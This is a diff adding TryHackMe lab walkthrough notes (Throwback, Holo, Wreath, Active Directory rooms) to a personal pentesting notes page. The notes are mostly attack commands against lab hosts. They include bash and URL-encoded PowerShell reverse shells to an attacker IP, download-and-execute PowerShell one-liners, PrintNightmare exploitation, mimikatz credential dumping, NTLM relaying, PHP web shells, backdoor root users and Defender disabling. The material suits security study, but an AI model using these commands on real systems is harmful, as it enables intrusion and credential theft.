@@ -318,6 +318,12 @@
         <br><span>last_update:Dec.27.2023</span>
         <script src="displayVisitorInfo.js"></script>
         <br><span id="visitorInfo"></span>
+        <br><span>Thanks to </span>
+        <span><a href="https://www.youtube.com/@ippsec" target="_blank">[Ippsec]</a></span>
+        <span><a href="https://0xdf.gitlab.io/" target="_blank">[0xdf]</a></span>
+        <span><a href="https://tib3rius.com/" target="_blank">[Tib3rius]</a></span>
+        <span><a href="https://benheater.com/blog/" target="_blank">[0xBEN]</a></span>
+        <span><a href="https://www.youtube.com/@derronc" target="_blank">[Derron C]</a></span>
     </header>
 
     <main>
@@ -3276,7 +3282,6 @@
             </div>
         </div>
         <!-- ========================hackthebox_machines_content======================== -->
-        <!-- ---------------------------------------147--------------------------------------- -->
         <!-- ========================provingground_play_content======================== -->
         <div class="dropdown">
             <button class="dropdown_button" id="provingground_play_button"></button>
@@ -3308,7 +3313,6 @@
             </div>
         </div>
         <!-- ========================provingground_play_content======================== -->
-        <!-- ---------------------------------------94--------------------------------------- -->
         <!-- ========================provingground_practice_content======================== -->
         <div class="dropdown">
             <button class="dropdown_button" id="provingground_practice_button"></button>
@@ -3340,7 +3344,701 @@
             </div>
         </div>
         <!-- ========================provingground_practice_content======================== -->
-        <!-- ---------------------------------------89--------------------------------------- -->
+        <!-- ========================tryhackme_content======================== -->
+        <div class="dropdown">
+            <button class="dropdown_button" id="tryhackme_button"></button>
+            <div class="dropdown_content" id="tryhackme_content">
+
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/tryhackme_icon.png" alt="img"> <span>Throwback(deprecated)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <br>this box has been taken off the site, and it was not cheap($30 for 30 days), here are some steps.
+                        <br>https://medium.com/@hyphens443/tryhackme-active-directory-throwback-network-f5bbb0105f23
+                        <br>John Hammond video part1 length 5:52:44 https://www.youtube.com/watch?v=mQT38VR4boQ
+                        <br>John Hammond video part2 length 7:12:21 https://www.youtube.com/watch?v=ukFC48bzVSM
+                        <br>LLMNR and NBT-NS Poisoning. LLMNR(Link-local Multicast Name Resolution) NBT-NS(NetBIOS Name Service) 
+                        <br>the attacker can obtain authentication data of a user who requested a non-existent resource.
+                        <br>`responder -I tun0 -rdw -v` when a user typo a domain, we can catch NTLMv2 hash and crack
+                        <br>Email phishing with payload.exe 
+                        <br>meterpreter_session `hashdump`, empire_agent [rubeus kerberoast /outfile:roast.hash]
+                        <br>pivoting use msf module post/multi/manage/autoroute
+                        <br>http://10.200.15.176/index.php timekeep user login crackmapexect password spray got login
+                        <br>setup msf module exploit/windows/misc/hta_server and upload payload.xlsm
+                        <br>enum windows defender command list:
+                        <br>sc.exe query windefend
+                        <br>#querying Windows Defender service
+                        <br>wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct
+                        <br>#anti-malware product detection
+                        <br>Get-Service | where {$_.DisplayName -Like "*Defender*"} | Select Status, DisplayName
+                        <br>#Services having Defender in Name.
+                        <br>Get-MpComputerStatus
+                        <br>Get-MpPreference
+                        <br>#Get a list of current configurations
+                        <br>Set-MpPreference -DisableRealtimeMonitoring $true
+                        <br>#disable real-time protection
+                        <br>Set-MpPreference -ExclusionPath C:\Users\Hacker
+                        <br>#exclude a location from real-time protection and scheduled scanning
+                        <br>Set-MpPreference -ExclusionExtension asp
+                        <br>#exclude a file type from being scanned
+                        <br>Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $false
+                        <br>Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true
+                        <br>PowerShell — ping sweeper: `1..255 | % {ping -n 1 -w 60 10.200.15.$_} | Select-String ttl`
+                        <br>PowerShell — Checking ARP Tables: `arp -a`
+                        <br>PowerShell — DNS querying: `[System.Net.Dns]::GetHostbyAddress("10.200.15.176")`  `[System.Net.Dns]::GetHostAddresses("THROWBACK-DC01")`
+                        <br>......
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/tryhackme_icon.png" alt="img"> <span>Holo</span> </button>    
+                    <div class="sub_dropdown_content">
+                        <br>Thanks to Mr Jokar https://medium.com/system-weakness/holo-network-writeup-tryhackme-lets-hack-active-directory-network-fea687dfa02f
+                        <br>once connected openvpn, `route` found 10.200.69.0/24 subnet from 10.50.70.1 gateway(openvpn)
+                        <br>`nmap -sn -T4 -n 10.200.69.0/24` found .33 and .250 
+                        <br>further nmap found 10.200.111.33[22,80,33060] 10.200.111.250[22,1337]
+                        <br>'gobuster vhost' or `ffuf -u http://10.200.69.33 -H "Host:FUZZ.holo.live" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 1288` found subdomain: dev www admin
+                        <br>admin.holo.live/robots.txt shows /var/www/admin/db.php /var/www/admin/dashboard.php /var/www/admin/supersecretdir/creds.txt
+                        <br>gobuster dir found dev.holo.live/talents.php and its source code have dev.holo.live/img.php?file=images/gura.jpg
+                        <br>LFI http://dev.holo.live/img.php?file=images/../../../../etc/passwd
+                        <br>LFI found cred admin:DBManagerLogin!  http://dev.holo.live/img.php?file=images/../../../../var/www/admin/supersecretdir/creds.txt
+                        <br>login admin.holo.live redirect to /dashboard.php found hint $_GET['cmd'] in source code
+                        <br>the ?cmd parm can also be found by `ffuf -b PHPSESSID=mur4v5tp7jhu400gs6l91qikbu -u http://admin.holo.live/dashboard.php\?FUZZ\=pwd -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 15869`
+                        <br>payload [/bin/bash -c "bash -i >& /dev/tcp/<Attack_IP>/9001 0>&1"] got www-data shell
+                        <br><span class="step_title">now we have 10.200.69.33 container www-data</span>
+                        <br>/var/www/admin/db_connect.php found define('DB_SRV', '192.168.100.1');define('DB_PASSWD', "!123SecureAdminDashboard321!"); define('DB_USER', 'admin');define('DB_NAME', 'DashboardDB');
+                        <br>container `mysql -h 192.168.100.1 -u admin -p` with pass: !123SecureAdminDashboard321! 
+                        <br>`show databases;` `use DashboardDB;` `show tables;` `select * from users;` found cred admin:DBManagerLogin!  gurag:AAAA
+                        <br>linpeas show we are in a container, there is also a file /.dockerenv 
+                        <br>`route` `arp -a` show gateway found subnet then container upload nmap.sh run `./nmap -sn -n 192.168.100.0/24`
+                        <br>kali set listener and container `nc kali_ip port` and kali received, means container can reach outside
+                        <br>kali `./chisel server -p 12000 --reverse` container `./chisel client 10.50.70.97:12000 R:socks &` 
+                        <br>container `./nmap -p- 192.168.100.1 --min-rate 1000`
+                        <br>kali `proxychains -q nmap -sT -Pn -p 22,80,3306,8080,33060 -sC -sV -T5 192.168.100.1`
+                        <br>kali `proxychains -q mysql -h 192.168.100.1 -u admin -p`  `select '&lt;?php $cmd=$_GET["cmd"];system($cmd);?&gt;' INTO OUTFILE '/var/www/html/shell.php';`
+                        <br>kali `proxychains -q curl http://192.168.100.1:8080/revshell.php\?cmd\="whoami"`
+                        <br><span class="step_title">now we have 10.200.69.33 www-data</span>
+                        <br>linpeas found SUID -rwsr-xr-x 1 root root 85029736 Oct 14  2020 /usr/bin/docker
+                        <br>`docker image ls` found 'ubuntu 18.04' then `/usr/bin/docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt bash`
+                        <br>read host file, crack 1 from /etc/shadow linux-admin:linuxrulez
+                        <br>add a uid=0 user into /etc/passwd and ssh as that user, we got host machine root
+                        <br>I mostly use: `echo 'username:$1$username$MkaiE3rS.z62Rvejgmc.Z/:0:0:/root/root:/bin/bash' >> /etc/passwd`
+                        <br>note: `openssl passwd -1 -salt username password` got salted_hash part
+                        <br><span class="step_title">now we have 10.200.69.33 root</span>
+                        <br>besides using uploaded nmap binary we can use bash and nc
+                        <br>ping sweep on target 
+                        <br>`for i in {1..255}; do (ping -c 1 192.168.100.$i | grep "bytes from" &);done` 
+                        <br>`for i in {1..255}; do (ping -c 1 10.200.69.$i | grep "bytes from" &);done`
+                        <br>TTL 128 is Windows so .30 , .31 and .35 are windows machines.
+                        <br>TTL 64 is any type of Unix and Android so .33 and .250 are Unix.
+                        <br>TTL 255 or above is usually Cisco. So .1 is probably the Cisco router.
+                        <br>So .250 and .1 are out of our range because .1 is the router and .250 is the VPN Server.
+                        <br>port scan on target 
+                        <br>`for port in {1..10000}; do (echo >/dev/tcp/10.200.69.30/$port) &>/dev/null && (echo "Port $port is open:"; nc -w 1 -v 10.200.69.31 $port &lt;/dev/null | grep -i 'banner\|title\|name\|version') & done | grep succeeded`
+                        <br>but nmap always more acurate, upload nmap binary and `nmap 10.200.69.30,31,35 -Pn -n -T5` 
+                        <br>pivot: swtich chisel(don't need ssh access) to sshuttle(don't need add `proxychains` before running commands)
+                        <br>`sshuttle -r username@10.200.69.33 10.200.69.0/24 192.168.100.0/24`
+                        <br>on .31 webpage if we click 'Forgot Password?' we can use the user_token hidden in the cookie to reset gurag password
+                        <br>after login, we found home.php is a simple image upload page, upload shell.php success
+                        <br>gobuster dir found /images  http://10.200.95.31/images/shell.php?cmd=whoami and it's a system shell
+                        <br><span class="step_title">now we have 10.200.69.31 system</span>
+                        <br>upload mimikatz dump creds
+                        <br>`c:\windows\temp\mimikatzmine.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::lsa /patch" exit`
+                        <br>got cred watamet:Nothingtoworry!
+                        <br>`crackmapexec smb 10.200.95.30 10.200.95.35 -u users.txt -H hashes.txt`
+                        <br>got cred watamet:d8d41e6cf762a8c77776a1843d4141c9
+                        <br>`xfreerdp /u:watamet /p:Nothingtoworry! +clipboard /dynamic-resolution /cert:ignore /v:10.200.95.35 /drive:share,/opt/`
+                        <br><span class="step_title">now we have 10.200.69.35 watamet</span>
+                        <br>`bloodhound-python -c ALL --dns-tcp -u 'watamet@holo.live' -p 'Nothingtoworry!' --zip -ns 10.200.95.30 -d holo.live`
+                        <br>PS C:\Windows\System32\spool\drivers\color> iex(new-object net.webclient).downloadstring('http://10.50.74.163/PowerUp.ps1')
+                        <br>PS C:\Windows\System32\spool\drivers\color> Invoke-AllChecks
+                        <br>bloodhound and powerup both found nothing interesting
+                        <br>kali `impacket-rpcdump @10.200.95.35 | egrep 'MS-RPRN|MS-PAR'`
+                        <br>Protocol: [MS-RPRN]: Print System Remote Protocol
+                        <br>Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
+                        <br>So target is vulnerable
+                        <br>CVE-2021-1675 - PrintNightmare LPE (PowerShell)
+                        <br>method_1 RCE 
+                        <br>`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.74.163 LPORT=9002 -f dll -o innocent.dll`
+                        <br>`rlwrap nc -lnvp 9002` `impacket-smbserver share -smb2support .`
+                        <br>https://github.com/cube0x0/CVE-2021-1675
+                        <br>`python3 CVE-2021-34527.py -d holo.live holo.live/watamet:Nothingtoworry!@10.200.69.35 --remote-dll '\\\\10.50.74.163\\share\\innocent.dll'`
+                        <br>method_1 Local Priv Esc
+                        <br>https://github.com/calebstewart/CVE-2021-1675
+                        <br>PS C:\Users\watamet> iex(new-object net.webclient).downloadstring('http://10.50.74.163/CVE-2021-1675.ps1')
+                        <br>PS C:\Users\watamet> Invoke-Nightmare
+                        <br># if success, we have a administrator account admin:P@ssw0rd
+                        <br><span class="step_title">now we have 10.200.69.35 administrator</span>
+                        <br>NTLM Relay Attack Requirements: 
+                        <br>1. A fully compromised machine in the AD
+                        <br>2. victim machine SMB signing disabled(if it's enabled, it'll flag the NTLM challenge malicious, because it's not from/signed_by kali, but from/sign_by .35 and kali forward it)
+                        <br>3. due to kali is not in target network, we need to setup remote port forwarding
+                        <br>To comfirm [SMB signing disabled] 
+                        <br>method_1 `crackmapexec smb 10.200.95.30 10.200.95.32`
+                        <br>method_2 `nmap 10.200.95.30 -p 445 -sC -sV -sT -Pn`
+                        <br>method_3 `responder-RunFinger -f ips.txt`
+                        <br>To shutdown 10.200.69.35 SMB services
+                        <br>`sc stop netlogon`
+                        <br>`sc stop lanmanserver`
+                        <br>`sc config lanmanserver start= disabled`
+                        <br>`sc stop lanmanworkstation`
+                        <br>`sc config lanmanworkstation start= disabled`
+                        <br>`shutdown -r`
+                        <br>To setup remote port forwarding on 10.200.69.35
+                        <br>method_1 meterpreter> portfwd add -R -L 0.0.0.0 -l 445 -p 445
+                        <br>method_2 kali# `./chisel server -p 12000 --reverse`  10.200.69.35> `./chisel client 10.50.70.97:12000 R:socks`
+                        <br>To setup relay on kali
+                        <br>`ntlmrelayx.py -t smb://10.200.111.30 -smb2support -socks` OR `impacket-ntlmrelayx`
+                        <br>To trigger relay
+                        <br>`proxychains impacket-smbexec -no-pass HOLOLIVE/SRV-ADMIN@10.200.95.30` OR `smbexec.py`
+                        <br>Sequence: [proxychains smbexec -no-pass] trigger [.35 connect request to .30] [.30 send challenge to .35] [.35 portforward challenge to kali] [kali ntlmrelayx.py --target .30] [.30 don't have SMB signing enabled, so it respond the challenge]
+                        <br>So... To my understanding, the .30(DC) is responding to its own NTLM challenge
+                        <br><span class="step_title">now we have 10.200.69.30 system</span>
+                        <br>`net user add username password123! && net localgroup Administrators username /add`
+                        <br>`secretsdump.py holo.live/username@10.200.95.30`
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/tryhackme_icon.png" alt="img"> <span>Wreath</span> </button>    
+                    <div class="sub_dropdown_content">
+                        <br>nmap scan MiniServ 1.890 Webmin is vulnerable to CVE-2019-15107
+                        <br>`git clone https://github.com/MuirlandOracle/CVE-2019-15107`
+                        <br>`cd CVE-2019–15107 ; pip3 install -r requirements.txt`
+                        <br>`./CVE-2019–15107.py 10.200.93.200`
+                        <br><span class="step_title">now we have 10.200.67.200 root</span>
+                        <br>save root ssh private key
+                        <br>To setup proxy:
+                        <br>`sshuttle --dns  -r root@10.200.93.200 --ssh-cmd "ssh -i id_rsa" 10.200.93.0/24 -x 10.200.93.200`
+                        <br>To do ping sweep in target network:
+                        <br>`for i in {1..255}; do (ping -c 1 10.200.93.${i} | grep “bytes from” &); done` OR upload nmap binary `./nmap-pencer -sn 10.200.93.1-255`
+                        <br>we found .100 has no port open and .150 has 80,135,139,445,3389,5985
+                        <br>http defualt page got hint gitstack, searchsploit found GitStack 2.3.10 - Remote Code Execution https://www.exploit-db.com/exploits/43777
+                        <br>edit ip in 43777.py and `python2 43777.py` we got code execution as system
+                        <br><span class="step_title">now we have 10.200.93.150 system</span>
+                        <br>`curl -X POST http://10.200.93.150/web/exploit-pencer.php -d "a=systeminfo"` windows server 2019 x64
+                        <br>.200 `firewall-cmd --list-all` only '10000/tcp' is open
+                        <br>.200 `firewall-cmd --zone=public --add-port 15999/tcp`
+                        <br>`wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat`
+                        <br>.200 `./socat tcp-l:15999 tcp:10.50.94.52:1337
+                        <br>`nc -nlvp 1337` `curl -X POST http://10.200.93.150/web/exploit-pencer.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.93.200%27%2C15999%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"`
+                        <br>the payload is targeting .200:15999 and the socat forward to shell back to our kali
+                        <br>Persistence: 
+                        <br>.150 `net user pencer Password123 /add & net localgroup Administrators pencer /add & net localgroup "Remote Management Users" pencer /add`
+                        <br>`xfreerdp /v:10.200.93.150 /u:pencer /p:'Password123' +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share`
+                        <br>.150 `c:\windows\temp\mimikatzmine.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::lsa /patch" exit`
+                        <br>`evil-winrm -u administrator -H hash -i 10.200.93.150` OR `evil-winrm -u pencer -p Password123 -i 10.200.93.150`
+                        <br>I don't use msfconsole and empire unless I have to, So I'll skip the empire part.
+                        <br>I like to upload a windows nmap.exe to .150 and install to scan the last machine 10.200.93.100
+                        <br>To setup portforward: 
+                        <br>.150 `./chisel.exe server -p 15997 --socks5`
+                        <br>kali `./chisel_1.7.6_linux_amd64 client 10.200.93.150:15997 9090:socks`
+                        <br>we found .100 web server is like a dev version of the one on .150
+                        <br>.150 evil-winrm `download C:\Gitstack\repositories\website.git`
+                        <br>`git clone https://github.com/internetwache/GitTools && GitTools/Extractor/extractor.sh . website` 
+                        <br>gittool output 3 folders/commits, `find . -name "*.php"` found upload function in resources/index.php
+                        <br>test_payload: `exiftool -Comment="&lt;?php echo \"&lt;pre&gt;Test Payload&lt;/pre&gt;\"; die(); ?&gt;" test-test.jpeg.php`
+                        <br>login .100/resources and upload test-test.jpeg.php trigger with .100/resources/uploads/test-test.jpeg.php
+                        <br>cmd_payload: &lt;?php $cmd = $_GET["pencer"]; if(isset($cmd)){ echo "&lt;pre&gt;" . shell_exec($cmd) . "&lt;/pre&gt;"; } die(); ?&gt;
+                        <br>`exiftool test-test.jpeg.php` check comment section spell
+                        <br>use https://www.gaijin.at/en/tools/php-obfuscator to obfuscate the payload and add to file's comment
+                        <br><span class="step_title">now we have 10.200.93.100 thomas</span>
+                        <br>'SeImpersonatePrivilege Enabled' we can use juicy-potato, SweetPotato, PrintSpoofer, but room direct us to 'unquoted service path'
+                        <br>.100 `wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """`
+                        <br>output: 'System Explorer Service  SystemExplorerHelpService  C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe  Auto'
+                        <br>.100 `sc qc SystemExplorerHelpService`
+                        <br>output: 'SERVICE_START_NAME : LocalSystem' which means it's run by system
+                        <br>.100 `powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"`
+                        <br>output: 'BUILTIN\Users Allow  FullControl' which means we can write in the folder
+                        <br>!!!Thanks to Tib3rius course!!!, I know that we need to check whether thomas can restart the service, which the room lack this step.
+                        <br>upload accesschk.exe to .100 and `accesschk.exe -accepteula -cv thomas SystemExplorerHelpService`
+                        <br>I assume output has 'SERVICE_START' and 'SERVICE_STOP'
+                        <br>As for payload, normally I'd go with msfvenom, but the room shows something new to me.
+                        <br>`apt install mono-devel` edit Wrapper.cs `mcs Wrapper.cs` upload Wrapper.exe to target
+                        <br>remember to test the payload before place the binary
+                        <br>.100 `copy %temp%\wrapper-pencer.exe "C:\Program Files (x86)\System Explorer\System.exe"`
+                        <br><span class="step_title">now we have 10.200.93.100 system</span>
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/tryhackme_icon.png" alt="img"> <span>Breaching Active Directory</span> </button>    
+                    <div class="sub_dropdown_content">
+                        <br><span class="step_title">Intro</span>
+                        <br>config DNS `systemd-resolve --interface breachad --set-dns 10.200.24.101 --set-domain za.tryhackme.com`
+                        <br>OR edit /etc/resolv.conf  'search za.tryhackme.com' 'nameserver 10.200.54.101' on up of another nameserver
+                        <br>`systemctl restart networking.service`
+                        <br>test DNS `ping za.tryhackme.com` `nslookup thmdc.za.tryhackme.com`
+                        <br><span class="step_title">OSINT & Phishing</span>
+                        <br>download and unzip the usernames room provided
+                        <br>`hydra -I -V -L ./usernames.txt -p 'Changeme123' ntlmauth.za.tryhackme.com http-get '/:A=NTLM:F=401'` which found 4 creds
+                        <br><span class="step_title">LDAP Bind Credentials</span>
+                        <br>Follow room instructions on setting up a rogues LDAP server, conduct 'LDAP pass-back attacks'
+                        <br>find password: tryhackmeldappass1@ using wireshark filter network traffic
+                        <br>`sudo responder -I tun0` capture NetNTLM hash, crack with john got password: tryhackmeldappass1@
+                        <br><span class="step_title">Authen Relays</span>
+                        <br>NBT-NS and LLMNR are ways to resolve hostnames to IP addresses on the LAN. WPAD is a way for Windows hosts to auto-discover web proxies.
+                        <br>Since these are layer 2 protocols, any time we use Responder to capture and poison requests, we must be on the same LAN as the target.
+                        <br>`sudo responder -I tun0` capture NetNTLM hash, crack with john got password: FPassword1!
+                        <br><span class="step_title">Microsoft Deployment Toolkit</span>
+                        <br>`ssh thm@THMJMP1.za.tryhackme.com` `powershell -ep bypass`
+                        <br>simulate a PXE client sending a DHCP request and receiving a list of BCD files for configuration. 
+                        <br>navigate to http://pxeboot.za.tryhackme.com/ and just pretend you're a DHCP client that's received a list of files.
+                        <br>`tftp -i (Resolve-DnsName thmmdt.za.tryhackme.com).IPAddress GET "\Tmp\x64{BFA810B9-DF7D-401C-B5B6-2F4D37258344}.bcd" conf.bcd`
+                        <br>Analyze the Boot Image
+                        <br>`Import-Module .\powerpxe\PowerPXE.ps1`
+                        <br>`$bcdfile = "conf.bcd"`
+                        <br>`Get-WimFile -bcdFile $bcdfile`
+                        <br>>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
+                        <br>`$wimfile = '\Boot\x64\Images\LiteTouchPE_x64.wim'`
+                        <br>`$mdtserver = (Resolve-DnsName thmmdt.za.tryhackme.com).IPAddress`
+                        <br>`tftp -i $mdtserver GEt "$wimfile" pxeboot.wim`
+                        <br>`Get-FindCredentials -WimFile .\pxeboot.wim` found svcMDT:PXEBootSecure1@ 
+                        <br><span class="step_title">Configuration Files</span>
+                        <br>`scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db ma.db`
+                        <br>`sqlite3 ./ma.db` OR `sqlitebrowser ./ma.db &`
+                        <br>sqlite> .tables
+                        <br>sqlite> .schema AGENT_REPOSITORIES
+                        <br>sqlite> SELECT DOMAIN, AUTH_USER, AUTH_PASSWD FROM AGENT_REPOSITORIES;
+                        <br>output: za.tryhackme.com|svcAV|jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
+                        <br>sqlite> .quit
+                        <br>`encrypted_pw='jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='`
+                        <br>`python2 ./mcafee-sitelist-pwd-decryption-master/mcafee_sitelist_pwd_decrypt.py $encryped_pw`
+                        <br>Decrypted password : MyStrongPassword!
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/tryhackme_icon.png" alt="img"> <span>Enumerating Active Directory</span> </button>    
+                    <div class="sub_dropdown_content">
+                        <br>`openvpn --config ./adenumeration.ovpn --daemon`
+                        <br>edit /etc/resolv.conf  'search za.tryhackme.com' 'nameserver 10.200.54.101' on up of another nameserver
+                        <br>`systemctl restart networking.service`
+                        <br>test DNS `ping za.tryhackme.com` `nslookup thmdc.za.tryhackme.com`
+                        <br>`ssh user.name@za.tryhackme.com@thmjmp1.za.tryhackme.com`
+                        <br>`xfreerdp /d:za.tryhackme.com /u:'user.name' /p:'password' /v:thmjmp1.za.tryhackme.com /drive:.,kali-share +clipboard`
+                        <br><span class="step_title">Credential Injection</span>
+                        <br>`runas.exe /netonly /user:domain.tld\username cmd.exe`
+                        <br>`runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe kali-vpn-ip kali-tcp-port"`
+                        <br>/netonly - use the credentials for network sessions only, all other commands run in the current user session on the local host
+                        <br>An attacker could then use the network session to enumerate SYSVOL on the domain controller, since even low level users can read it
+                        <br>SYSVOL: a network folder on a domain controller which is accessible by any authenticated AD account and stores GPO information
+                        <br>FQDN: It represents a specific and complete address, such as host.example.com.
+                        <br>Subdomain: It's a prefix added to the main domain, creating variations like subdomain.example.com.
+                        <br><span class="step_title">Enumerating though Command Prompt</span>
+                        <br>`net user /domain` Run on a domain-joined host to enumerate domain users
+                        <br>`net user user.name /domain` Run on a domain-joined host to get information about a specific domain user
+                        <br>`net group /domain` Run on a domain-joined host to enumerate domain groups
+                        <br>`net group groupName /domain` Run on a domain-joined host to get the members of a domain group
+                        <br>`net accounts /domain` Run on a domain-joined host to show the domain password and account lockout policy
+                        <br>!!! net does not show nested groups
+                        <br>!!! net only shows up to 10 groups even if a user is in more
+                        <br><span class="step_title">Enumeration through PowerShell</span>
+                        <br>`Get-ADUser -Filter *` return all domain users
+                        <br>`Get-ADUser -Filter 'Name -like "*stevens"'` find any user where name ends in ...stevens
+                        <br>`Get-ADUser -Identity john.doe -Properties *` find the user john.doe and return all properties
+                        <br>`Get-ADGroup -Filter *` return all domain groups
+                        <br>`Get-ADGroup -Identity Administrators | Get-ADGroupMember` pipe the Administrators group object to Get-ADGroupMember to retrieve members of the group
+                        <br>Get any domain objects that we modified on or after a specific date and time
+                        <br>`$modifiedDate = Get-Date '2022/02/28'`  `Get-ADObject -Filter "whenChanged -ge $modifiedDate" -IncludeDeletedObjects`
+                        <br>Change a User Password
+                        <br>`$oldPass = Read-Host -AsSecureString -Prompt 'Enter the old password'`
+                        <br>`$newPass = Read-Host -AsSecureString -Prompt 'Enter the new password'`
+                        <br>`Set-ADAccountPassword -Identity user.name -OldPassword $oldpPass -NewPassword $newPass`
+                        <br><span class="step_title">0xBEN: PowerShell AD Module on Any Domain Host as Any User</span>
+                        <br>https://notes.benheater.com/books/active-directory/page/powershell-ad-module-on-any-domain-host-as-any-user?ref=benheater.com
+                        <br>Normally, one must install RSAT (Remote Server Administration Tools) on a host to make remote calls to Active Directory from a client computer. 
+                        <br>And, one must normally be an administrative user to import the PowerShell Active Directory module.
+                        <br>The trick here is borrowing the Microsoft.ActiveDirectory.Management.dll from a domain-joined host with RSAT installed.
+                        <br>Getting the DLL
+                        <br>`Get-WindowsCapability -Name RSAT*ActiveDirectory* -Online | Add-WindowsCapability -Online`
+                        <br>Finding the DLL
+                        <br>`gci -Path 'C:\Windows' -Recurse -Filter 'Microsoft.ActiveDirectory.Management.dll' -EA SilentlyContinue | ? {$_.FullName -like '*GAC_64*' -or $_.FullName -like '*amd64*'} | select -Expand FullName`
+                        <br>Import to PowerShell
+                        <br>Import-Module 'C:\Path\to\file.dll'
+                        <br>Using the Module
+                        <br>Get-Command -Module Microsoft.ActiveDirectory.Management
+                        <br><span class="step_title">Bloodhound</span>
+                        <br>https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip
+                        <br>`Invoke-WebRequest http://kali-vpn-ip/SharpHound-v1.1.0.zip -OutFile SharpHound-v1.1`
+                        <br>`Expand-Archive SharpHound-v1.1.0.zip ; cd SharpHound-v1.1.0`
+                        <br>`.\SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs`
+                        <br>`scp username@za.tryhackme.com@thmjmp1.za.tryhackme.com:C:/Users/username/Documents/SharpHound-v1.1.0/20220805005305_BloodHound.zip .`
+                        <br>`neo4j console & ; bloodhound &` import zip and start analize
+                        <br><span class="step_title">Additional Enumeration Techniques</span>
+                        <br>=====LdapDomainDump https://notes.benheater.com/books/active-directory/page/ldapdomaindump
+                        <br>nmap found: '389/tcp ldap' '636/tcp ldapssl' '3268/tcp globalcatLDAP' '3269/tcp globalcatLDAPssl'
+                        <br>`ldapdomaindump -u domain.tld\username -p password -o /tmp/ldap_stuff dc-ip-address`
+                        <br>`proxychains -q ldapdomaindump -u domain.tld\username -p password -o /tmp/ldap_stuff dc-ip-address`
+                        <br>=====PowerView.ps1 https://powersploit.readthedocs.io/en/latest/Recon/ https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
+                        <br>=====WMI https://0xinfection.github.io/posts/wmi-ad-enum/
+                        <br>WMI stands for Windows Management Instrumentation, and it's a powerful framework within the Windows operating system that provides access to a vast range of system information, settings, and management functionalities.
+                        <br>list out the available classes
+                        <br>`Get-WmiObject -Namespace root\directory\ldap -Class ds_* -List`
+                        <br>Finding the domain name
+                        <br>`Get-WmiObject -Namespace root\directory\ldap -Class ds_domain | select ds_dc, ds_distinguishedname, pscomputername`
+                        <br>Getting the domain policy
+                        <br>`Get-WmiObject -Namespace root\directory\ldap -Class ds_domain | select ds_lockoutduration, ds_lockoutobservationwindow, ds_lockoutthreshold, ds_maxpwdage, ds_minpwdage, ds_minpwdlength, ds_pwdhistorylength, ds_pwdproperties`
+                        <br>Finding the domain controller 
+                        <br>`Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | where { $_.ds_useraccountcontrol -match 532480 } | select ds_cn, ds_dnshostname, ds_operatingsystem, ds_lastlogon, ds_pwdlastset`
+                        <br>Searching user accounts
+                        <br>`Get-WmiObject -Class win32_useraccount | select name, domain, accounttype`
+                        <br>Filter out just the user accounts for a single domain
+                        <br>`Get-WmiObject -Class win32_useraccount -Filter 'domain="infected"' | select caption`
+                        <br>Enumerating currently logged-on users
+                        <br>`Get-WmiObject -Class win32_loggedonuser | where { $_ -match 'infected' } | foreach {[wmi]$_.antecedent}`
+                        <br>Fetching groups
+                        <br>`Get-WmiObject -Class win32_groupindomain | foreach {[wmi]$_.partcomponent}`
+                        <br>Figuring out group memberships
+                        <br>`Get-WmiObject -Class win32_groupuser | where { $_.groupcomponent -match 'domain admins' } | foreach {[wmi]$_.partcomponent}`
